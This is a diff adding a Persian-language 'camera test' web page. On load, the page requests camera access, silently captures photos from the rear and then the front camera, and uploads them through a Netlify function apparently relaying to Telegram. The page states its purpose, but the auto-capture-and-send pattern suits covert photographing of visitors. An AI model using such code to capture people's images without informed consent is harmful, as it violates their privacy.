@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحه آزمایشی دوربین تلگرام</title>
+    <style>
+        body {
+            font-family: Tahoma, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+        h1 {
+            color: #4a90e2;
+        }
+        .container {
+            margin-top: 30px;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        video {
+            display: none; 
+            max-width: 100%;
+            height: auto;
+        }
+        canvas {
+            display: none; 
+            margin-top: 15px;
+            max-width: 100%;
+            height: auto;
+            border: 2px solid #5cb85c;
+            border-radius: 5px;
+        }
+        .message {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #ffe0b2;
+            border-radius: 5px;
+            color: #fb8c00;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>👋 به صفحه آزمایشی خوش آمدید!</h1>
+        <p>صفحه در حال تلاش برای دسترسی به دوربین و ارسال عکس به تلگرام است.</p>
+        <div class="message">
+            **لطفاً به مرورگر اجازه دسترسی به دوربین دهید.** (این فقط روی HTTPS کار می‌کند)
+        </div>
+        <p id="status">...</p>
+        
+        <video id="videoElement" autoplay playsinline></video>
+        <canvas id="canvasElement"></canvas>
+    </div>
+
+    <script>
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvasElement');
+        const statusElement = document.getElementById('status');
+        const context = canvas.getContext('2d');
+
+        function startCamera(facingMode) {
+            const modeText = facingMode === 'environment' ? 'عقب' : 'جلو';
+            statusElement.textContent = `درخواست دسترسی به دوربین ${modeText} ...`;
+            
+            const constraints = {
+                video: { facingMode: facingMode },
+                audio: false
+            };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(function(stream) {
+                    statusElement.textContent = `دوربین ${modeText} فعال شد. گرفتن عکس...`;
+                    video.srcObject = stream;
+                    
+                    video.onloadedmetadata = function(e) {
+                        setTimeout(() => {
+                            captureAndSend(stream, facingMode);
+                            if (facingMode === 'environment') {
+                                setTimeout(() => {
+                                    startCamera('user');
+                                }, 3000); 
+                            }
+                        }, 1500); 
+                    };
+                })
+                .catch(function(err) {
+                    statusElement.textContent = `خطا در دسترسی به دوربین ${modeText}: ${err.name}.`;
+                    console.error("خطا:", err);
+                    
+                    if (facingMode === 'environment') {
+                         setTimeout(() => {
+                            startCamera('user');
+                        }, 1000); 
+                    }
+                });
+        }
+
+        function captureAndSend(stream, facingMode) {
+            const modeText = facingMode === 'environment' ? 'عقب' : 'جلو';
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.style.display = 'block';
+
+            canvas.toBlob(function(blob) {
+                
+                const formData = new FormData();
+                formData.append('photo', blob, 'photo.jpeg'); 
+                formData.append('caption', `عکس گرفته شده توسط دوربین ${modeText} (${new Date().toLocaleString('fa-IR')})`);
+
+                statusElement.textContent = `در حال ارسال عکس دوربین ${modeText} به سرور واسط Netlify...`;
+
+                // **آدرس Netlify Function**
+                fetch('/.netlify/functions/telegram-send', { 
+                    method: 'POST',
+                    body: formData 
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        statusElement.textContent = `✅ عکس دوربین ${modeText} با موفقیت به تلگرام ارسال شد.`;
+                    } else {
+                        statusElement.textContent = `❌ خطا در ارسال عکس دوربین ${modeText}: ${data.error || 'خطای نامشخص'}`;
+                    }
+                })
+                .catch(error => {
+                    statusElement.textContent = `❌ خطا در ارتباط با سرور واسط برای دوربین ${modeText}.`;
+                    console.error('Fetch Error:', error);
+                });
+
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+                
+            }, 'image/jpeg', 0.9);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                 startCamera('environment'); 
+            } else {
+                statusElement.textContent = "مرورگر شما از MediaDevices API پشتیبانی نمی کند.";
+            }
+        });
+    </script>
+
+</body>
+</html>
